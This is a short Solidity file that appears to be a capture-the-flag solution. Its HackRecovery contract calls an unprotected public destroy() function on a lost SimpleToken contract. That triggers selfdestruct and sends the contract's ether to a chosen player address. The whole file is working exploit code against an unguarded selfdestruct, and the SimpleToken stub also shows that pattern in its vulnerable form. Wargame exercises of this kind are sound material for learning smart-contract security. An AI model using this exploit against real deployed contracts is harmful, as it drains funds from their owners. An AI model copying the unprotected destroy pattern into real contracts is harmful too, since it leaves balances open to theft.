// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackRecovery {

    function recover(address payable _lostContract, address payable player) public {
        SimpleToken(_lostContract).destroy(player);
    }
}

contract SimpleToken {
    function destroy(address payable _to) public {
        selfdestruct(_to);
  }
}